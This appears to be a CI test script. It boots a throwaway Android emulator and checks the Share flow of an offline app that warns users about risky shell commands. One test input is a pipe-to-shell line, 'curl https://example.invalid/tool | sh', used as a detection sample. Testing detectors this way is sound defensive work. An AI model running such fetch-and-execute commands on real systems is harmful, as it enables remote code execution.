#!/usr/bin/env python3
"""Exercise synthetic Share flows on a disposable hosted Android emulator."""
import argparse
import datetime as dt
import hashlib
import json
import os
from pathlib import Path
import re
import selectors
import shlex
import shutil
import subprocess
import signal
import stat
import tempfile
import time
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET

ROOT=Path(__file__).resolve().parents[1]
PACKAGE='com.aitrustid.android'
COMPONENT=PACKAGE+'/.CheckActivity'
IMAGE='system-images;android-36;default;x86_64'
LICENSE_HASH='efa68a6b3c661d18699d5c026771d5911cdc2f83'
GOOGLE_REPOSITORY='https://dl.google.com/android/repository/'
METADATA_LIMIT=4*1024*1024
DISK_MINIMUM=6*1024**3
SDK_TIMEOUT_SECONDS=270
SDK_OUTPUT_LIMIT=1024*1024
PACKAGES={
    'emulator':('repository2-3.xml','37.3.10','emulator-linux_x64-16970787.zip',350068887,'5f7314368fc6c05c937f6991bb4106214dc389e7'),
    IMAGE:('sys-img/android/sys-img2-3.xml','2','x86_64-36_r02.zip',844217077,'829c076e8ff448a336097ae25a355b495ba36e2c'),
}


def existing_license_record(path):
    """Read only a bounded regular SDK acceptance record; never accept a license."""
    fd=os.open(path,os.O_RDONLY|os.O_NOFOLLOW|os.O_NONBLOCK)
    try:
        info=os.fstat(fd)
        if not stat.S_ISREG(info.st_mode) or not 0<info.st_size<=8192:
            raise ValueError('Existing SDK license record unavailable')
        raw=os.read(fd,8193)
        if len(raw)>8192 or not raw.strip():
            raise ValueError('Existing SDK license record unavailable')
        lines=raw.decode('ascii').splitlines()
        if not all(not line.strip() or re.fullmatch('[0-9a-f]{40}',line.strip()) for line in lines):
            raise ValueError('Existing SDK license record malformed')
        return raw
    finally:
        os.close(fd)


def sdk_install(argv):
    """Run the existing manager with closed stdin and bounded private diagnostics."""
    with subprocess.Popen(argv,stdin=subprocess.DEVNULL,stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT,start_new_session=True) as process:
        output=bytearray();deadline=time.monotonic()+SDK_TIMEOUT_SECONDS;completed=False
        try:
            with selectors.DefaultSelector() as selector:
                selector.register(process.stdout,selectors.EVENT_READ)
                while selector.get_map():
                    left=deadline-time.monotonic()
                    if left<=0:raise ValueError('Reviewed SDK install timeout')
                    for key,_ in selector.select(min(left,1)):
                        chunk=os.read(key.fileobj.fileno(),16384)
                        if not chunk:
                            selector.unregister(key.fileobj)
                        else:
                            output.extend(chunk)
                            if len(output)>SDK_OUTPUT_LIMIT:
                                raise ValueError('Reviewed SDK diagnostics exceeded limit')
            code=process.wait(timeout=max(.001,deadline-time.monotonic()))
            completed=True
            return code,bytes(output)
        finally:
            # On error this unreaped child still reserves the owned group ID.
            # Do not kill a numeric process/group ID after successful wait/reap.
            if not completed and process.returncode is None:
                try:os.killpg(process.pid,signal.SIGKILL)
                except ProcessLookupError:pass
            process.wait(timeout=5)


class MetadataRefusal(ValueError):
    """Only fixed, non-sensitive metadata boundaries may reach the public report."""
    CODES=frozenset({'metadata_http_status','metadata_redirect','metadata_transport',
        'metadata_size','metadata_parse','metadata_license_drift',
        'metadata_package_drift','metadata_revision_drift','metadata_archive_drift'})

    def __init__(self,code):
        if code not in self.CODES:raise ValueError('Invalid metadata diagnostic code')
        self.code=code
        super().__init__(code)


class RejectMetadataRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self,req,fp,code,msg,headers,newurl):
        raise MetadataRefusal('metadata_redirect')


def require_metadata_identity(package, expected):
    relative,revision,archive_name,archive_size,checksum=expected
    url=GOOGLE_REPOSITORY+relative
    try:
        with urllib.request.build_opener(RejectMetadataRedirect()).open(url,timeout=15) as response:
            if response.geturl()!=url:raise MetadataRefusal('metadata_redirect')
            if response.status!=200:raise MetadataRefusal('metadata_http_status')
            raw=response.read(METADATA_LIMIT+1)
    except MetadataRefusal:raise
    except urllib.error.HTTPError:
        raise MetadataRefusal('metadata_http_status') from None
    except (OSError,urllib.error.URLError):
        raise MetadataRefusal('metadata_transport') from None
    if len(raw)>METADATA_LIMIT:
        raise MetadataRefusal('metadata_size')
    try:root=ET.fromstring(raw)
    except ET.ParseError:raise MetadataRefusal('metadata_parse') from None
    licenses=[node for node in root.findall('license') if node.get('id')=='android-sdk-license']
    if len(licenses)!=1 or hashlib.sha1((licenses[0].text or '').encode()).hexdigest()!=LICENSE_HASH:
        raise MetadataRefusal('metadata_license_drift')
    candidates=[node for node in root.findall('remotePackage') if node.get('path')==package and
                (node.find('channelRef') is None or node.find('channelRef').get('ref')=='channel-0')]
    if len(candidates)!=1:
        raise MetadataRefusal('metadata_package_drift')
    selected=candidates[0]
    revision_node=selected.find('revision')
    if revision_node is None or not len(revision_node) or any(not node.text for node in revision_node):
        raise MetadataRefusal('metadata_parse')
    declared='.'.join(node.text for node in revision_node)
    if declared!=revision:raise MetadataRefusal('metadata_revision_drift')
    license_node=selected.find('uses-license')
    if license_node is None or license_node.get('ref')!='android-sdk-license':
        raise MetadataRefusal('metadata_license_drift')
    matches=[node.find('complete') for node in selected.findall('archives/archive')
             if node.findtext('host-os') in (None,'linux') and node.find('complete') is not None
             and node.find('complete').findtext('url')==archive_name]
    if (len(matches)!=1 or matches[0].findtext('size')!=str(archive_size)
            or matches[0].findtext('checksum')!=checksum):
        raise MetadataRefusal('metadata_archive_drift')
    return {'package':package,'metadata_sha256':hashlib.sha256(raw).hexdigest(),
            'metadata_bytes':len(raw),'revision':declared,'license_sha1':LICENSE_HASH}


def installed_revision(component):
    descriptor=component/'source.properties'
    with descriptor.open('rb') as stream:
        raw=stream.read(8193)
    if len(raw)>8192:
        raise ValueError('Installed SDK descriptor exceeded the review limit')
    match=re.findall(r'^Pkg\.Revision\s*=\s*([0-9.]+)\s*$',raw.decode('utf-8'),re.MULTILINE)
    return match[0] if len(match)==1 else None


def prepare_emulator(sdk, report):
    manager=sdk/'cmdline-tools/latest/bin/sdkmanager'
    avd=sdk/'cmdline-tools/latest/bin/avdmanager'
    adb=sdk/'platform-tools/adb'
    emulator=sdk/'emulator/emulator'
    image=sdk/'system-images/android-36/default/x86_64/system.img'
    license_file=sdk/'licenses/android-sdk-license'
    try:license_raw=existing_license_record(license_file)
    except (OSError,ValueError,UnicodeError):license_raw=b''
    inventory={
        'github_hosted_linux':os.environ.get('GITHUB_ACTIONS')=='true' and os.environ.get('AITRUST_ANDROID_RUNNER')=='github-hosted' and os.environ.get('RUNNER_OS')=='Linux',
        'sdkmanager':os.access(manager,os.X_OK),'avdmanager':os.access(avd,os.X_OK),'adb':os.access(adb,os.X_OK),
        'emulator_preinstalled':os.access(emulator,os.X_OK),'aosp_image_preinstalled':image.is_file(),
        'kvm_device_exists':Path('/dev/kvm').exists(),'kvm_access':os.access('/dev/kvm',os.R_OK|os.W_OK),
        'existing_license_record':bool(license_raw),
        'metadata_license_hash_recorded':LICENSE_HASH.encode() in license_raw.splitlines(),
        'sdk_writable':os.access(sdk,os.W_OK),'sdk_free_bytes':shutil.disk_usage(sdk).free,
    }
    report['prerequisites']=inventory
    required=['github_hosted_linux','sdkmanager','avdmanager','adb','kvm_access','existing_license_record']
    missing=[key for key in required if not inventory[key]]
    if missing:
        report['reason']='Existing disposable runner prerequisites unavailable.'
        report['missing_prerequisites']=missing
        return None
    if (inventory['emulator_preinstalled'] and installed_revision(emulator.parent)!=PACKAGES['emulator'][1]
        or inventory['aosp_image_preinstalled'] and installed_revision(image.parent)!=PACKAGES[IMAGE][1]):
        raise ValueError('Installed SDK package revision differs from review')
    needed=[key for key,present in [('emulator',inventory['emulator_preinstalled']),(IMAGE,inventory['aosp_image_preinstalled'])] if not present]
    report['bound_revisions']={key:value[1] for key,value in PACKAGES.items()}
    report['requested_packages']=needed
    report['existing_license_record_sha256']=hashlib.sha256(license_raw).hexdigest()
    report['sdk_license_acceptance_inferred_from_metadata_hash']=False
    if needed:
        if not inventory['sdk_writable'] or inventory['sdk_free_bytes']<DISK_MINIMUM:
            report['reason']='Hosted SDK directory lacks write access or download space.'
            return None
        report['phase']='reviewed_metadata'
        report['metadata_reviews']=[]
        for package in needed:
            report['metadata_reviews'].append(require_metadata_identity(package,PACKAGES[package]))
        report['phase']='sdk_install'
        try:
            code,diagnostics=sdk_install([str(manager),f'--sdk_root={sdk}','--channel=0','--install',*needed])
        finally:
            if existing_license_record(license_file)!=license_raw:
                raise ValueError('SDK license record changed unexpectedly')
        report['license_record_unchanged']=True
        if re.search(rb'\blicenses?\b[^\r\n]{0,512}\bnot (?:been )?accepted\b',diagnostics,re.I):
            report['reason']='The SDK manager refused installation under its existing license record.'
            report['missing_prerequisites']=['existing_sdk_license_acceptance']
            return None
        if code or not os.access(emulator,os.X_OK) or not image.is_file():
            raise ValueError('Reviewed SDK install failed with closed stdin')
    if installed_revision(emulator.parent)!=PACKAGES['emulator'][1] or installed_revision(image.parent)!=PACKAGES[IMAGE][1]:
        raise ValueError('Installed SDK package version differs from review')
    return adb,emulator,avd

def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--sdk-root',required=True);parser.add_argument('--apk',required=True)
    args=parser.parse_args();output=ROOT/'output/android-share/emulator.json';cases=[];process=None;started=time.monotonic();avd_home=None
    report={'format':'ai-trust-id-android-emulator/v1','recorded_at':dt.datetime.now(dt.timezone.utc).isoformat(),'status':'UNAVAILABLE','pass':False,'physical_device_evidence':False,'independent_accuracy_evidence':False,'cases':cases}
    try:
        sdk=Path(args.sdk_root).resolve(strict=True)
        prepared=prepare_emulator(sdk,report)
        if prepared is None:return 0
        adb,emulator,avd=prepared
        avd_home=tempfile.TemporaryDirectory(prefix='aitrust-share-avd-',dir=os.environ['RUNNER_TEMP'])
        env={**os.environ,'ANDROID_AVD_HOME':avd_home.name}
        def run(argv,timeout=10,input_bytes=b''):
            p=subprocess.run([str(x) for x in argv],input=input_bytes,capture_output=True,env=env,timeout=timeout)
            if p.returncode:raise ValueError('Emulator command failed')
            if len(p.stdout)>524288:raise ValueError('Oversized emulator reply')
            return p.stdout
        # A fixed dedicated emulator name/port prevents selecting a connected phone.
        devices=run([adb,'devices']).decode()
        if 'emulator-5580' in devices:raise ValueError('Dedicated emulator port already occupied')
        report['phase']='create_avd'
        run([avd,'create','avd','--name','aitrust-share-ci','--package',IMAGE],timeout=20,input_bytes=b'no\n')
        report['phase']='boot'
        process=subprocess.Popen([str(emulator),'-avd','aitrust-share-ci','-port','5580','-no-window','-no-audio','-no-boot-anim','-no-snapshot','-wipe-data','-gpu','swiftshader','-memory','2048','-cores','2'],env=env,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        def shell(argv,timeout=10):return run([adb,'-s','emulator-5580','shell',shlex.join([str(x) for x in argv])],timeout)
        boot=time.monotonic()+90
        while time.monotonic()<boot:
            if process.poll() is not None:raise ValueError('Owned emulator stopped')
            try:
                if shell(['getprop','sys.boot_completed'],5).strip()==b'1':break
            except (ValueError,subprocess.SubprocessError):pass
            time.sleep(1)
        else:raise ValueError('Owned emulator boot timeout')
        report['phase']='install_apk'
        run([adb,'-s','emulator-5580','install','--no-streaming',args.apk],timeout=30)
        shell(['wm','dismiss-keyguard'])
        shell(['svc','wifi','disable']);shell(['svc','data','disable'])
        report['phase']='share_controls'
        def tree():
            shell(['uiautomator','dump','/sdcard/aitrust-synthetic-window.xml'],10)
            return ET.fromstring(shell(['cat','/sdcard/aitrust-synthetic-window.xml'],5))
        def wait(predicate,seconds=40):
            deadline=time.monotonic()+seconds
            while time.monotonic()<deadline:
                view=tree()
                if predicate(view):return view
                time.sleep(.2)
            raise ValueError('Expected Android UI state unavailable')
        def text(view,value):return any(value in n.attrib.get('text','') for n in view.iter('node'))
        def click(view,rid):
            node=next(n for n in view.iter('node') if n.attrib.get('resource-id')==PACKAGE+':id/'+rid)
            coords=list(map(int,re.fullmatch(r'\[(\d+),(\d+)\]\[(\d+),(\d+)\]',node.attrib['bounds']).groups()))
            shell(['input','tap',(coords[0]+coords[2])//2,(coords[1]+coords[3])//2])
        def send(value,kind='text/plain',action='android.intent.action.SEND'):
            shell(['am','start','-W','-a',action,'-t',kind,'--es','android.intent.extra.TEXT',value,'-n',COMPONENT],20)
        send('curl https://example.invalid/tool | sh')
        view=wait(lambda x:text(x,'Text received. Review it'))
        assert not text(view,'Review before running this command.')
        cases.append({'case':'receive_requires_explicit_check','pass':True})
        click(view,'check');view=wait(lambda x:text(x,'Review before running this command.'))
        assert any(n.attrib.get('resource-id')==PACKAGE+':id/tag' and n.attrib.get('text')=='PS' for n in view.iter('node'))
        cases.append({'case':'actual_offline_ps_finding','pass':True})
        click(view,'editor');shell(['input','text','X']);view=wait(lambda x:text(x,'Text changed. Tap Check'))
        assert not any(n.attrib.get('resource-id')==PACKAGE+':id/tag' for n in view.iter('node'))
        cases.append({'case':'edit_hides_previous_finding','pass':True})
        send('printf hello');view=wait(lambda x:text(x,'Text received. Review it'));click(view,'check')
        wait(lambda x:text(x,'No supported command pattern found.'))
        cases.append({'case':'new_share_and_no_finding','pass':True})
        send('ignored','image/png');wait(lambda x:text(x,'Files and multiple items are not supported.'))
        cases.append({'case':'unsupported_mime_has_no_verdict','pass':True})
        send('printf hello');view=wait(lambda x:text(x,'Text received. Review it'));click(view,'clear')
        view=wait(lambda x:text(x,'Cleared. Your text and result'))
        assert not text(view,'printf hello')
        cases.append({'case':'clear_removes_input_and_result','pass':True})
        send('synthetic private marker');wait(lambda x:text(x,'Text received. Review it'));shell(['input','keyevent','KEYCODE_HOME'])
        # Bring the existing task forward without a new Share or launcher intent.
        # A fresh intent would itself wipe the editor and mask a broken onStop.
        tasks=shell(['dumpsys','activity','activities']).decode()
        match=re.search(r'Task\{[^\n]*#(\d+)[^\n]*'+re.escape(PACKAGE),tasks)
        if not match:raise ValueError('Owned Android task not found')
        shell(['am','task','focus',match.group(1)])
        view=wait(lambda x:text(x,'Ready when you are.') or text(x,'Cleared. Your text and result'))
        assert not text(view,'synthetic private marker')
        cases.append({'case':'background_clears_text','pass':True})
        permission_occurrences=shell(['dumpsys','package',PACKAGE]).decode().count('android.permission.INTERNET')
        if permission_occurrences:raise ValueError('Unexpected Android Internet permission')
        report.update(status='EXECUTED',phase='complete',**{'pass':True},api_level=shell(['getprop','ro.build.version.sdk']).decode().strip(),case_count=len(cases),internet_permission=False)
        return 0
    except MetadataRefusal as error:
        report.update(status='FAILED',reason='Reviewed official SDK metadata was refused.',diagnostic_code=error.code);return 1
    except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
        report.update(status='FAILED',reason='A required owned-emulator share, lifecycle or offline check did not complete.');return 1
    finally:
        if process is not None:
            process.terminate()
            try:process.wait(timeout=10)
            except subprocess.TimeoutExpired:process.kill();process.wait(timeout=5)
        if avd_home is not None:avd_home.cleanup()
        report['elapsed_seconds']=round(time.monotonic()-started,3)
        output.parent.mkdir(parents=True,exist_ok=True);output.write_text(json.dumps(report,indent=2)+'\n');print(json.dumps(report,indent=2))
if __name__=='__main__':raise SystemExit(main())
